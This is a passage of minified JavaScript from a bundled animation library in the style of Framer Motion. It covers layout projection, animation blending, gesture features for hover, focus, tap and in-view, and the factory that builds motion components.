      this.options = {
        ...this.options,
        ...i,
        crossfade: i.crossfade !== void 0 ? i.crossfade : !0
      }
    }
    clearMeasurements() {
      this.scroll = void 0,
        this.layout = void 0,
        this.snapshot = void 0,
        this.prevTransformTemplateValue = void 0,
        this.targetDelta = void 0,
        this.target = void 0,
        this.isLayoutDirty = !1
    }
    forceRelativeParentToResolveTarget() {
      this.relativeParent && this.relativeParent.resolvedRelativeTargetAt !== Be.timestamp && this.relativeParent.resolveTargetDelta(!0)
    }
    resolveTargetDelta(i = !1) {
      var l;
      const c = this.getLead();
      this.isProjectionDirty || (this.isProjectionDirty = c.isProjectionDirty),
        this.isTransformDirty || (this.isTransformDirty = c.isTransformDirty),
        this.isSharedProjectionDirty || (this.isSharedProjectionDirty = c.isSharedProjectionDirty);
      const u = !!this.resumingFrom || this !== c;
      if (!(i || u && this.isSharedProjectionDirty || this.isProjectionDirty || !((l = this.parent) === null || l === void 0) && l.isProjectionDirty || this.attemptToResolveRelativeTarget || this.root.updateBlockedByResize))
        return;
      const { layout: f, layoutId: h } = this.options;
      if (!(!this.layout || !(f || h))) {
        if (this.resolvedRelativeTargetAt = Be.timestamp,
          !this.targetDelta && !this.relativeTarget) {
          const y = this.getClosestProjectingParent();
          y && y.layout && this.animationProgress !== 1 ? (this.relativeParent = y,
            this.forceRelativeParentToResolveTarget(),
            this.relativeTarget = Ae(),
            this.relativeTargetOrigin = Ae(),
            Zo(this.relativeTargetOrigin, this.layout.layoutBox, y.layout.layoutBox),
            kt(this.relativeTarget, this.relativeTargetOrigin)) : this.relativeParent = this.relativeTarget = void 0
        }
        if (!(!this.relativeTarget && !this.targetDelta)) {
          if (this.target || (this.target = Ae(),
            this.targetWithTransforms = Ae()),
            this.relativeTarget && this.relativeTargetOrigin && this.relativeParent && this.relativeParent.target ? (this.forceRelativeParentToResolveTarget(),
              tA(this.target, this.relativeTarget, this.relativeParent.target)) : this.targetDelta ? (this.resumingFrom ? this.target = this.applyTransform(this.layout.layoutBox) : kt(this.target, this.layout.layoutBox),
                Z1(this.target, this.targetDelta)) : kt(this.target, this.layout.layoutBox),
            this.attemptToResolveRelativeTarget) {
            this.attemptToResolveRelativeTarget = !1;
            const y = this.getClosestProjectingParent();
            y && !!y.resumingFrom == !!this.resumingFrom && !y.options.layoutScroll && y.target && this.animationProgress !== 1 ? (this.relativeParent = y,
              this.forceRelativeParentToResolveTarget(),
              this.relativeTarget = Ae(),
              this.relativeTargetOrigin = Ae(),
              Zo(this.relativeTargetOrigin, this.target, y.target),
              kt(this.relativeTarget, this.relativeTargetOrigin)) : this.relativeParent = this.relativeTarget = void 0
          }
          Fo && Or.resolvedTargetDeltas++
        }
      }
    }
    getClosestProjectingParent() {
      if (!(!this.parent || Ld(this.parent.latestValues) || J1(this.parent.latestValues)))
        return this.parent.isProjecting() ? this.parent : this.parent.getClosestProjectingParent()
    }
    isProjecting() {
      return !!((this.relativeTarget || this.targetDelta || this.options.layoutRoot) && this.layout)
    }
    calcProjection() {
      var i;
      const l = this.getLead()
        , c = !!this.resumingFrom || this !== l;
      let u = !0;
      if ((this.isProjectionDirty || !((i = this.parent) === null || i === void 0) && i.isProjectionDirty) && (u = !1),
        c && (this.isSharedProjectionDirty || this.isTransformDirty) && (u = !1),
        this.resolvedRelativeTargetAt === Be.timestamp && (u = !1),
        u)
        return;
      const { layout: d, layoutId: f } = this.options;
      if (this.isTreeAnimating = !!(this.parent && this.parent.isTreeAnimating || this.currentAnimation || this.pendingAnimation),
        this.isTreeAnimating || (this.targetDelta = this.relativeTarget = void 0),
        !this.layout || !(d || f))
        return;
      kt(this.layoutCorrected, this.layout.layoutBox);
      const h = this.treeScale.x
        , y = this.treeScale.y;
      uA(this.layoutCorrected, this.treeScale, this.path, c),
        l.layout && !l.target && (this.treeScale.x !== 1 || this.treeScale.y !== 1) && (l.target = l.layout.layoutBox,
          l.targetWithTransforms = Ae());
      const { target: b } = l;
      if (!b) {
        this.prevProjectionDelta && (this.createProjectionDeltas(),
          this.scheduleRender());
        return
      }
      !this.projectionDelta || !this.prevProjectionDelta ? this.createProjectionDeltas() : (xg(this.prevProjectionDelta.x, this.projectionDelta.x),
        xg(this.prevProjectionDelta.y, this.projectionDelta.y)),
        Jo(this.projectionDelta, this.layoutCorrected, b, this.latestValues),
        (this.treeScale.x !== h || this.treeScale.y !== y || !Ag(this.projectionDelta.x, this.prevProjectionDelta.x) || !Ag(this.projectionDelta.y, this.prevProjectionDelta.y)) && (this.hasProjected = !0,
          this.scheduleRender(),
          this.notifyListeners("projectionUpdate", b)),
        Fo && Or.recalculatedProjection++
    }
    hide() {
      this.isVisible = !1
    }
    show() {
      this.isVisible = !0
    }
    scheduleRender(i = !0) {
      var l;
      if ((l = this.options.visualElement) === null || l === void 0 || l.scheduleRender(),
        i) {
        const c = this.getStack();
        c && c.scheduleRender()
      }
      this.resumingFrom && !this.resumingFrom.instance && (this.resumingFrom = void 0)
    }
    createProjectionDeltas() {
      this.prevProjectionDelta = js(),
        this.projectionDelta = js(),
        this.projectionDeltaWithTransform = js()
    }
    setAnimationOrigin(i, l = !1) {
      const c = this.snapshot
        , u = c ? c.latestValues : {}
        , d = {
          ...this.latestValues
        }
        , f = js();
      (!this.relativeParent || !this.relativeParent.options.layoutRoot) && (this.relativeTarget = this.relativeTargetOrigin = void 0),
        this.attemptToResolveRelativeTarget = !l;
      const h = Ae()
        , y = c ? c.source : void 0
        , b = this.layout ? this.layout.source : void 0
        , v = y !== b
        , C = this.getStack()
        , g = !C || C.members.length <= 1
        , m = !!(v && !g && this.options.crossfade === !0 && !this.path.some(XA));
      this.animationProgress = 0;
      let p;
      this.mixTargetDelta = w => {
        const S = w / 1e3;
        Dg(f.x, i.x, S),
          Dg(f.y, i.y, S),
          this.setTargetDelta(f),
          this.relativeTarget && this.relativeTargetOrigin && this.layout && this.relativeParent && this.relativeParent.layout && (Zo(h, this.layout.layoutBox, this.relativeParent.layout.layoutBox),
            YA(this.relativeTarget, this.relativeTargetOrigin, h, S),
            p && TA(this.relativeTarget, p) && (this.isProjectionDirty = !1),
            p || (p = Ae()),
            kt(p, this.relativeTarget)),
          v && (this.animationValues = d,
            CA(d, u, this.latestValues, S, m, g)),
          this.root.scheduleUpdateProjection(),
          this.scheduleRender(),
          this.animationProgress = S
      }
        ,
        this.mixTargetDelta(this.options.layoutRoot ? 1e3 : 0)
    }
    startAnimation(i) {
      this.notifyListeners("animationStart"),
        this.currentAnimation && this.currentAnimation.stop(),
        this.resumingFrom && this.resumingFrom.currentAnimation && this.resumingFrom.currentAnimation.stop(),
        this.pendingAnimation && (Cr(this.pendingAnimation),
          this.pendingAnimation = void 0),
        this.pendingAnimation = de.update(() => {
          Va.hasAnimatedSinceResize = !0,
            this.currentAnimation = _A(0, Eg, {
              ...i,
              onUpdate: l => {
                this.mixTargetDelta(l),
                  i.onUpdate && i.onUpdate(l)
              }
              ,
              onComplete: () => {
                i.onComplete && i.onComplete(),
                  this.completeAnimation()
              }
            }),
            this.resumingFrom && (this.resumingFrom.currentAnimation = this.currentAnimation),
            this.pendingAnimation = void 0
        }
        )
    }
    completeAnimation() {
      this.resumingFrom && (this.resumingFrom.currentAnimation = void 0,
        this.resumingFrom.preserveOpacity = void 0);
      const i = this.getStack();
      i && i.exitAnimationComplete(),
        this.resumingFrom = this.currentAnimation = this.animationValues = void 0,
        this.notifyListeners("animationComplete")
    }
    finishAnimation() {
      this.currentAnimation && (this.mixTargetDelta && this.mixTargetDelta(Eg),
        this.currentAnimation.stop()),
        this.completeAnimation()
    }
    applyTransformsToTarget() {
      const i = this.getLead();
      let { targetWithTransforms: l, target: c, layout: u, latestValues: d } = i;
      if (!(!l || !c || !u)) {
        if (this !== i && this.layout && u && uw(this.options.animationType, this.layout.layoutBox, u.layoutBox)) {
          c = this.target || Ae();
          const f = jt(this.layout.layoutBox.x);
          c.x.min = i.target.x.min,
            c.x.max = c.x.min + f;
          const h = jt(this.layout.layoutBox.y);
          c.y.min = i.target.y.min,
            c.y.max = c.y.min + h
        }
        kt(l, c),
          As(l, d),
          Jo(this.projectionDeltaWithTransform, this.layoutCorrected, l, d)
      }
    }
    registerSharedNode(i, l) {
      this.sharedNodes.has(i) || this.sharedNodes.set(i, new kA),
        this.sharedNodes.get(i).add(l);
      const u = l.options.initialPromotionConfig;
      l.promote({
        transition: u ? u.transition : void 0,
        preserveFollowOpacity: u && u.shouldPreserveFollowOpacity ? u.shouldPreserveFollowOpacity(l) : void 0
      })
    }
    isLead() {
      const i = this.getStack();
      return i ? i.lead === this : !0
    }
    getLead() {
      var i;
      const { layoutId: l } = this.options;
      return l ? ((i = this.getStack()) === null || i === void 0 ? void 0 : i.lead) || this : this
    }
    getPrevLead() {
      var i;
      const { layoutId: l } = this.options;
      return l ? (i = this.getStack()) === null || i === void 0 ? void 0 : i.prevLead : void 0
    }
    getStack() {
      const { layoutId: i } = this.options;
      if (i)
        return this.root.sharedNodes.get(i)
    }
    promote({ needsReset: i, transition: l, preserveFollowOpacity: c } = {}) {
      const u = this.getStack();
      u && u.promote(this, c),
        i && (this.projectionDelta = void 0,
          this.needsReset = !0),
        l && this.setOptions({
          transition: l
        })
    }
    relegate() {
      const i = this.getStack();
      return i ? i.relegate(this) : !1
    }
    resetSkewAndRotation() {
      const { visualElement: i } = this.options;
      if (!i)
        return;
      let l = !1;
      const { latestValues: c } = i;
      if ((c.z || c.rotate || c.rotateX || c.rotateY || c.rotateZ || c.skewX || c.skewY) && (l = !0),
        !l)
        return;
      const u = {};
      c.z && pu("z", i, u, this.animationValues);
      for (let d = 0; d < mu.length; d++)
        pu(`rotate${mu[d]}`, i, u, this.animationValues),
          pu(`skew${mu[d]}`, i, u, this.animationValues);
      i.render();
      for (const d in u)
        i.setStaticValue(d, u[d]),
          this.animationValues && (this.animationValues[d] = u[d]);
      i.scheduleRender()
    }
    getProjectionStyles(i) {
      var l, c;
      if (!this.instance || this.isSVG)
        return;
      if (!this.isVisible)
        return LA;
      const u = {
        visibility: ""
      }
        , d = this.getTransformTemplate();
      if (this.needsReset)
        return this.needsReset = !1,
          u.opacity = "",
          u.pointerEvents = Ba(i == null ? void 0 : i.pointerEvents) || "",
          u.transform = d ? d(this.latestValues, "") : "none",
          u;
      const f = this.getLead();
      if (!this.projectionDelta || !this.layout || !f.target) {
        const v = {};
        return this.options.layoutId && (v.opacity = this.latestValues.opacity !== void 0 ? this.latestValues.opacity : 1,
          v.pointerEvents = Ba(i == null ? void 0 : i.pointerEvents) || ""),
          this.hasProjected && !Rr(this.latestValues) && (v.transform = d ? d({}, "") : "none",
            this.hasProjected = !1),
          v
      }
      const h = f.animationValues || f.latestValues;
      this.applyTransformsToTarget(),
        u.transform = DA(this.projectionDeltaWithTransform, this.treeScale, h),
        d && (u.transform = d(h, u.transform));
      const { x: y, y: b } = this.projectionDelta;
      u.transformOrigin = `${y.origin * 100}% ${b.origin * 100}% 0`,
        f.animationValues ? u.opacity = f === this ? (c = (l = h.opacity) !== null && l !== void 0 ? l : this.latestValues.opacity) !== null && c !== void 0 ? c : 1 : this.preserveOpacity ? this.latestValues.opacity : h.opacityExit : u.opacity = f === this ? h.opacity !== void 0 ? h.opacity : "" : h.opacityExit !== void 0 ? h.opacityExit : 0;
      for (const v in Cl) {
        if (h[v] === void 0)
          continue;
        const { correct: C, applyTo: g } = Cl[v]
          , m = u.transform === "none" ? h[v] : C(h[v], f);
        if (g) {
          const p = g.length;
          for (let w = 0; w < p; w++)
            u[g[w]] = m
        } else
          u[v] = m
      }
      return this.options.layoutId && (u.pointerEvents = f === this ? Ba(i == null ? void 0 : i.pointerEvents) || "" : "none"),
        u
    }
    clearSnapshot() {
      this.resumeFrom = this.snapshot = void 0
    }
    resetTree() {
      this.root.nodes.forEach(i => {
        var l;
        return (l = i.currentAnimation) === null || l === void 0 ? void 0 : l.stop()
      }
      ),
        this.root.nodes.forEach(Tg),
        this.root.sharedNodes.clear()
    }
  }
}
function VA(e) {
  e.updateLayout()
}
function BA(e) {
  var t;
  const n = ((t = e.resumeFrom) === null || t === void 0 ? void 0 : t.snapshot) || e.snapshot;
  if (e.isLead() && e.layout && n && e.hasListeners("didUpdate")) {
    const { layoutBox: r, measuredBox: s } = e.layout
      , { animationType: o } = e.options
      , i = n.source !== e.layout.source;
    o === "size" ? Mt(f => {
      const h = i ? n.measuredBox[f] : n.layoutBox[f]
        , y = jt(h);
      h.min = r[f].min,
        h.max = h.min + y
    }
    ) : uw(o, n.layoutBox, r) && Mt(f => {
      const h = i ? n.measuredBox[f] : n.layoutBox[f]
        , y = jt(r[f]);
      h.max = h.min + y,
        e.relativeTarget && !e.currentAnimation && (e.isProjectionDirty = !0,
          e.relativeTarget[f].max = e.relativeTarget[f].min + y)
    }
    );
    const l = js();
    Jo(l, r, n.layoutBox);
    const c = js();
    i ? Jo(c, e.applyTransform(s, !0), n.measuredBox) : Jo(c, r, n.layoutBox);
    const u = !iw(l);
    let d = !1;
    if (!e.resumeFrom) {
      const f = e.getClosestProjectingParent();
      if (f && !f.resumeFrom) {
        const { snapshot: h, layout: y } = f;
        if (h && y) {
          const b = Ae();
          Zo(b, n.layoutBox, h.layoutBox);
          const v = Ae();
          Zo(v, r, y.layoutBox),
            aw(b, v) || (d = !0),
            f.options.layoutRoot && (e.relativeTarget = v,
              e.relativeTargetOrigin = b,
              e.relativeParent = f)
        }
      }
    }
    e.notifyListeners("didUpdate", {
      layout: r,
      snapshot: n,
      delta: c,
      layoutDelta: l,
      hasLayoutChanged: u,
      hasRelativeTargetChanged: d
    })
  } else if (e.isLead()) {
    const { onExitComplete: r } = e.options;
    r && r()
  }
  e.options.transition = void 0
}
function zA(e) {
  Fo && Or.totalNodes++,
    e.parent && (e.isProjecting() || (e.isProjectionDirty = e.parent.isProjectionDirty),
      e.isSharedProjectionDirty || (e.isSharedProjectionDirty = !!(e.isProjectionDirty || e.parent.isProjectionDirty || e.parent.isSharedProjectionDirty)),
      e.isTransformDirty || (e.isTransformDirty = e.parent.isTransformDirty))
}
function UA(e) {
  e.isProjectionDirty = e.isSharedProjectionDirty = e.isTransformDirty = !1
}
function $A(e) {
  e.clearSnapshot()
}
function Tg(e) {
  e.clearMeasurements()
}
function HA(e) {
  e.isLayoutDirty = !1
}
function WA(e) {
  const { visualElement: t } = e.options;
  t && t.getProps().onBeforeLayoutMeasure && t.notify("BeforeLayoutMeasure"),
    e.resetTransform()
}
function kg(e) {
  e.finishAnimation(),
    e.targetDelta = e.relativeTarget = e.target = void 0,
    e.isProjectionDirty = !0
}
function QA(e) {
  e.resolveTargetDelta()
}
function qA(e) {
  e.calcProjection()
}
function GA(e) {
  e.resetSkewAndRotation()
}
function KA(e) {
  e.removeLeadSnapshot()
}
function Dg(e, t, n) {
  e.translate = we(t.translate, 0, n),
    e.scale = we(t.scale, 1, n),
    e.origin = t.origin,
    e.originPoint = t.originPoint
}
function Mg(e, t, n, r) {
  e.min = we(t.min, n.min, r),
    e.max = we(t.max, n.max, r)
}
function YA(e, t, n, r) {
  Mg(e.x, t.x, n.x, r),
    Mg(e.y, t.y, n.y, r)
}
function XA(e) {
  return e.animationValues && e.animationValues.opacityExit !== void 0
}
const JA = {
  duration: .45,
  ease: [.4, 0, .1, 1]
}
  , Rg = e => typeof navigator < "u" && navigator.userAgent && navigator.userAgent.toLowerCase().includes(e)
  , Og = Rg("applewebkit/") && !Rg("chrome/") ? Math.round : Je;
function Ig(e) {
  e.min = Og(e.min),
    e.max = Og(e.max)
}
function ZA(e) {
  Ig(e.x),
    Ig(e.y)
}
function uw(e, t, n) {
  return e === "position" || e === "preserve-aspect" && !eA(Pg(t), Pg(n), .2)
}
function eE(e) {
  var t;
  return e !== e.root && ((t = e.scroll) === null || t === void 0 ? void 0 : t.wasRoot)
}
const tE = cw({
  attachResizeListener: (e, t) => kn(e, "resize", t),
  measureScroll: () => ({
    x: document.documentElement.scrollLeft || document.body.scrollLeft,
    y: document.documentElement.scrollTop || document.body.scrollTop
  }),
  checkIsScrollRoot: () => !0
})
  , gu = {
    current: void 0
  }
  , dw = cw({
    measureScroll: e => ({
      x: e.scrollLeft,
      y: e.scrollTop
    }),
    defaultParent: () => {
      if (!gu.current) {
        const e = new tE({});
        e.mount(window),
          e.setOptions({
            layoutScroll: !0
          }),
          gu.current = e
      }
      return gu.current
    }
    ,
    resetTransform: (e, t) => {
      e.style.transform = t !== void 0 ? t : "none"
    }
    ,
    checkIsScrollRoot: e => window.getComputedStyle(e).position === "fixed"
  })
  , nE = {
    pan: {
      Feature: gA
    },
    drag: {
      Feature: pA,
      ProjectionNode: dw,
      MeasureLayout: rw
    }
  };
function _g(e, t, n) {
  const { props: r } = e;
  e.animationState && r.whileHover && e.animationState.setActive("whileHover", n);
  const s = r[n ? "onHoverStart" : "onHoverEnd"];
  s && de.postRender(() => s(t, zi(t)))
}
class rE extends Tr {
  mount() {
    const { current: t, props: n } = this.node;
    t && (this.unmount = H4(t, r => (_g(this.node, r, !0),
      s => _g(this.node, s, !1)), {
      passive: !n.onHoverStart && !n.onHoverEnd
    }))
  }
  unmount() { }
}
class sE extends Tr {
  constructor() {
    super(...arguments),
      this.isActive = !1
  }
  onFocus() {
    let t = !1;
    try {
      t = this.node.current.matches(":focus-visible")
    } catch {
      t = !0
    }
    !t || !this.node.animationState || (this.node.animationState.setActive("whileFocus", !0),
      this.isActive = !0)
  }
  onBlur() {
    !this.isActive || !this.node.animationState || (this.node.animationState.setActive("whileFocus", !1),
      this.isActive = !1)
  }
  mount() {
    this.unmount = xr(kn(this.node.current, "focus", () => this.onFocus()), kn(this.node.current, "blur", () => this.onBlur()))
  }
  unmount() { }
}
const fw = (e, t) => t ? e === t ? !0 : fw(e, t.parentElement) : !1;
function yu(e, t) {
  if (!t)
    return;
  const n = new PointerEvent("pointer" + e);
  t(n, zi(n))
}
class oE extends Tr {
  constructor() {
    super(...arguments),
      this.removeStartListeners = Je,
      this.removeEndListeners = Je,
      this.removeAccessibleListeners = Je,
      this.startPointerPress = (t, n) => {
        if (this.isPressing)
          return;
        this.removeEndListeners();
        const r = this.node.getProps()
          , o = wr(window, "pointerup", (l, c) => {
            if (!this.checkPressEnd())
              return;
            const { onTap: u, onTapCancel: d, globalTapTarget: f } = this.node.getProps()
              , h = !f && !fw(this.node.current, l.target) ? d : u;
            h && de.update(() => h(l, c))
          }
            , {
              passive: !(r.onTap || r.onPointerUp)
            })
          , i = wr(window, "pointercancel", (l, c) => this.cancelPress(l, c), {
            passive: !(r.onTapCancel || r.onPointerCancel)
          });
        this.removeEndListeners = xr(o, i),
          this.startPress(t, n)
      }
      ,
      this.startAccessiblePress = () => {
        const t = o => {
          if (o.key !== "Enter" || this.isPressing)
            return;
          const i = l => {
            l.key !== "Enter" || !this.checkPressEnd() || yu("up", (c, u) => {
              const { onTap: d } = this.node.getProps();
              d && de.postRender(() => d(c, u))
            }
            )
          }
            ;
          this.removeEndListeners(),
            this.removeEndListeners = kn(this.node.current, "keyup", i),
            yu("down", (l, c) => {
              this.startPress(l, c)
            }
            )
        }
          , n = kn(this.node.current, "keydown", t)
          , r = () => {
            this.isPressing && yu("cancel", (o, i) => this.cancelPress(o, i))
          }
          , s = kn(this.node.current, "blur", r);
        this.removeAccessibleListeners = xr(n, s)
      }
  }
  startPress(t, n) {
    this.isPressing = !0;
    const { onTapStart: r, whileTap: s } = this.node.getProps();
    s && this.node.animationState && this.node.animationState.setActive("whileTap", !0),
      r && de.postRender(() => r(t, n))
  }
  checkPressEnd() {
    return this.removeEndListeners(),
      this.isPressing = !1,
      this.node.getProps().whileTap && this.node.animationState && this.node.animationState.setActive("whileTap", !1),
      !W1()
  }
  cancelPress(t, n) {
    if (!this.checkPressEnd())
      return;
    const { onTapCancel: r } = this.node.getProps();
    r && de.postRender(() => r(t, n))
  }
  mount() {
    const t = this.node.getProps()
      , n = wr(t.globalTapTarget ? window : this.node.current, "pointerdown", this.startPointerPress, {
        passive: !(t.onTapStart || t.onPointerStart)
      })
      , r = kn(this.node.current, "focus", this.startAccessiblePress);
    this.removeStartListeners = xr(n, r)
  }
  unmount() {
    this.removeStartListeners(),
      this.removeEndListeners(),
      this.removeAccessibleListeners()
  }
}
const Vd = new WeakMap
  , vu = new WeakMap
  , iE = e => {
    const t = Vd.get(e.target);
    t && t(e)
  }
  , aE = e => {
    e.forEach(iE)
  }
  ;
function lE({ root: e, ...t }) {
  const n = e || document;
  vu.has(n) || vu.set(n, {});
  const r = vu.get(n)
    , s = JSON.stringify(t);
  return r[s] || (r[s] = new IntersectionObserver(aE, {
    root: e,
    ...t
  })),
    r[s]
}
function cE(e, t, n) {
  const r = lE(t);
  return Vd.set(e, n),
    r.observe(e),
    () => {
      Vd.delete(e),
        r.unobserve(e)
    }
}
const uE = {
  some: 0,
  all: 1
};
class dE extends Tr {
  constructor() {
    super(...arguments),
      this.hasEnteredView = !1,
      this.isInView = !1
  }
  startObserver() {
    this.unmount();
    const { viewport: t = {} } = this.node.getProps()
      , { root: n, margin: r, amount: s = "some", once: o } = t
      , i = {
        root: n ? n.current : void 0,
        rootMargin: r,
        threshold: typeof s == "number" ? s : uE[s]
      }
      , l = c => {
        const { isIntersecting: u } = c;
        if (this.isInView === u || (this.isInView = u,
          o && !u && this.hasEnteredView))
          return;
        u && (this.hasEnteredView = !0),
          this.node.animationState && this.node.animationState.setActive("whileInView", u);
        const { onViewportEnter: d, onViewportLeave: f } = this.node.getProps()
          , h = u ? d : f;
        h && h(c)
      }
      ;
    return cE(this.node.current, i, l)
  }
  mount() {
    this.startObserver()
  }
  update() {
    if (typeof IntersectionObserver > "u")
      return;
    const { props: t, prevProps: n } = this.node;
    ["amount", "margin", "root"].some(fE(t, n)) && this.startObserver()
  }
  unmount() { }
}
function fE({ viewport: e = {} }, { viewport: t = {} } = {}) {
  return n => e[n] !== t[n]
}
const hE = {
  inView: {
    Feature: dE
  },
  tap: {
    Feature: oE
  },
  focus: {
    Feature: sE
  },
  hover: {
    Feature: rE
  }
}
  , mE = {
    layout: {
      ProjectionNode: dw,
      MeasureLayout: rw
    }
  }
  , Nh = x.createContext({
    transformPagePoint: e => e,
    isStatic: !1,
    reducedMotion: "never"
  })
  , ic = x.createContext({})
  , jh = typeof window < "u"
  , hw = jh ? x.useLayoutEffect : x.useEffect
  , mw = x.createContext({
    strict: !1
  });
function pE(e, t, n, r, s) {
  var o, i;
  const { visualElement: l } = x.useContext(ic)
    , c = x.useContext(mw)
    , u = x.useContext(oc)
    , d = x.useContext(Nh).reducedMotion
    , f = x.useRef();
  r = r || c.renderer,
    !f.current && r && (f.current = r(e, {
      visualState: t,
      parent: l,
      props: n,
      presenceContext: u,
      blockInitialAnimation: u ? u.initial === !1 : !1,
      reducedMotionConfig: d
    }));
  const h = f.current
    , y = x.useContext(nw);
  h && !h.projection && s && (h.type === "html" || h.type === "svg") && gE(f.current, n, s, y);
  const b = x.useRef(!1);
  x.useInsertionEffect(() => {
    h && b.current && h.update(n, u)
  }
  );
  const v = n[z1]
    , C = x.useRef(!!v && !(!((o = window.MotionHandoffIsComplete) === null || o === void 0) && o.call(window, v)) && ((i = window.MotionHasOptimisedAnimation) === null || i === void 0 ? void 0 : i.call(window, v)));
  return hw(() => {
    h && (b.current = !0,
      window.MotionIsMounted = !0,
      h.updateFeatures(),
      Ch.render(h.render),
      C.current && h.animationState && h.animationState.animateChanges())
  }
  ),
    x.useEffect(() => {
      h && (!C.current && h.animationState && h.animationState.animateChanges(),
        C.current && (queueMicrotask(() => {
          var g;
          (g = window.MotionHandoffMarkAsComplete) === null || g === void 0 || g.call(window, v)
        }
        ),
          C.current = !1))
    }
    ),
    h
}
function gE(e, t, n, r) {
  const { layoutId: s, layout: o, drag: i, dragConstraints: l, layoutScroll: c, layoutRoot: u } = t;
  e.projection = new n(e.latestValues, t["data-framer-portal-id"] ? void 0 : pw(e.parent)),
    e.projection.setOptions({
      layoutId: s,
      layout: o,
      alwaysMeasureLayout: !!i || l && Ns(l),
      visualElement: e,
      animationType: typeof o == "string" ? o : "both",
      initialPromotionConfig: r,
      layoutScroll: c,
      layoutRoot: u
    })
}
function pw(e) {
  if (e)
    return e.options.allowProjection !== !1 ? e.projection : pw(e.parent)
}
function yE(e, t, n) {
  return x.useCallback(r => {
    r && e.mount && e.mount(r),
      t && (r ? t.mount(r) : t.unmount()),
      n && (typeof n == "function" ? n(r) : Ns(n) && (n.current = r))
  }
    , [t])
}
function ac(e) {
  return nc(e.animate) || nh.some(t => Ci(e[t]))
}
function gw(e) {
  return !!(ac(e) || e.variants)
}
function vE(e, t) {
  if (ac(e)) {
    const { initial: n, animate: r } = e;
    return {
      initial: n === !1 || Ci(n) ? n : void 0,
      animate: Ci(r) ? r : void 0
    }
  }
  return e.inherit !== !1 ? t : {}
}
function xE(e) {
  const { initial: t, animate: n } = vE(e, x.useContext(ic));
  return x.useMemo(() => ({
    initial: t,
    animate: n
  }), [Lg(t), Lg(n)])
}
function Lg(e) {
  return Array.isArray(e) ? e.join(" ") : e
}
const Fg = {
  animation: ["animate", "variants", "whileHover", "whileTap", "exit", "whileInView", "whileFocus", "whileDrag"],
  exit: ["exit"],
  drag: ["drag", "dragControls"],
  focus: ["whileFocus"],
  hover: ["whileHover", "onHoverStart", "onHoverEnd"],
  tap: ["whileTap", "onTap", "onTapStart", "onTapCancel"],
  pan: ["onPan", "onPanStart", "onPanSessionStart", "onPanEnd"],
  inView: ["whileInView", "onViewportEnter", "onViewportLeave"],
  layout: ["layout", "layoutId"]
}
  , oo = {};
for (const e in Fg)
  oo[e] = {
    isEnabled: t => Fg[e].some(n => !!t[n])
  };
function wE(e) {
  for (const t in e)
    oo[t] = {
      ...oo[t],
      ...e[t]
    }
}
const bE = Symbol.for("motionComponentSymbol");
function SE({ preloadedFeatures: e, createVisualElement: t, useRender: n, useVisualState: r, Component: s }) {
  e && wE(e);
  function o(l, c) {
    let u;
    const d = {
      ...x.useContext(Nh),
      ...l,
      layoutId: CE(l)
    }
      , { isStatic: f } = d
      , h = xE(l)
      , y = r(l, f);
    if (!f && jh) {
      NE();
      const b = jE(d);
      u = b.MeasureLayout,
        h.visualElement = pE(s, y, d, t, b.ProjectionNode)
    }
    return a.jsxs(ic.Provider, {
      value: h,
      children: [u && h.visualElement ? a.jsx(u, {
        visualElement: h.visualElement,
        ...d
      }) : null, n(s, l, yE(y, h.visualElement, c), y, f, h.visualElement)]
    })
  }
  const i = x.forwardRef(o);
  return i[bE] = s,
    i
}
function CE({ layoutId: e }) {
  const t = x.useContext(Sh).id;
  return t && e !== void 0 ? t + "-" + e : e
}
function NE(e, t) {
  x.useContext(mw).strict
}
function jE(e) {
  const { drag: t, layout: n } = oo;
  if (!t && !n)
    return {};
  const r = {
    ...t,
    ...n
  };
  return {
    MeasureLayout: t != null && t.isEnabled(e) || n != null && n.isEnabled(e) ? r.MeasureLayout : void 0,
    ProjectionNode: r.ProjectionNode
  }
}
const PE = ["animate", "circle", "defs", "desc", "ellipse", "g", "image", "line", "filter", "marker", "mask", "metadata", "path", "pattern", "polygon", "polyline", "rect", "stop", "switch", "symbol", "svg", "text", "tspan", "use", "view"];
function Ph(e) {
  return typeof e != "string" || e.includes("-") ? !1 : !!(PE.indexOf(e) > -1 || /[A-Z]/u.test(e))
}
function yw(e, { style: t, vars: n }, r, s) {
  Object.assign(e.style, t, s && s.getProjectionStyles(r));
  for (const o in n)
    e.style.setProperty(o, n[o])
}
const vw = new Set(["baseFrequency", "diffuseConstant", "kernelMatrix", "kernelUnitLength", "keySplines", "keyTimes", "limitingConeAngle", "markerHeight", "markerWidth", "numOctaves", "targetX", "targetY", "surfaceScale", "specularConstant", "specularExponent", "stdDeviation", "tableValues", "viewBox", "gradientTransform", "pathLength", "startOffset", "textLength", "lengthAdjust"]);
function xw(e, t, n, r) {
  yw(e, t, void 0, r);
  for (const s in t.attrs)
    e.setAttribute(vw.has(s) ? s : bh(s), t.attrs[s])
}
function ww(e, { layout: t, layoutId: n }) {
  return rs.has(e) || e.startsWith("origin") || (t || n !== void 0) && (!!Cl[e] || e === "opacity")
}
function Ah(e, t, n) {
  var r;
  const { style: s } = e
    , o = {};
  for (const i in s)
    (Xe(s[i]) || t.style && Xe(t.style[i]) || ww(i, e) || ((r = n == null ? void 0 : n.getValue(i)) === null || r === void 0 ? void 0 : r.liveStyle) !== void 0) && (o[i] = s[i]);
  return o
}
function bw(e, t, n) {
  const r = Ah(e, t, n);
  for (const s in e)
    if (Xe(e[s]) || Xe(t[s])) {
      const o = Fi.indexOf(s) !== -1 ? "attr" + s.charAt(0).toUpperCase() + s.substring(1) : s;
      r[o] = e[s]
    }
  return r
}
function Eh(e) {
  const t = x.useRef(null);
  return t.current === null && (t.current = e()),
    t.current
}
function AE({ scrapeMotionValuesFromProps: e, createRenderState: t, onMount: n }, r, s, o) {
  const i = {
    latestValues: EE(r, s, o, e),
    renderState: t()
  };
  return n && (i.mount = l => n(r, l, i)),
    i
}
const Sw = e => (t, n) => {
  const r = x.useContext(ic)
    , s = x.useContext(oc)
    , o = () => AE(e, t, r, s);
  return n ? o() : Eh(o)
}
  ;
function EE(e, t, n, r) {
  const s = {}
    , o = r(e, {});
  for (const h in o)
    s[h] = Ba(o[h]);
  let { initial: i, animate: l } = e;
  const c = ac(e)
    , u = gw(e);
  t && u && !c && e.inherit !== !1 && (i === void 0 && (i = t.initial),
    l === void 0 && (l = t.animate));
  let d = n ? n.initial === !1 : !1;
  d = d || i === !1;
  const f = d ? l : i;
  if (f && typeof f != "boolean" && !nc(f)) {
    const h = Array.isArray(f) ? f : [f];
    for (let y = 0; y < h.length; y++) {
      const b = eh(e, h[y]);
      if (b) {
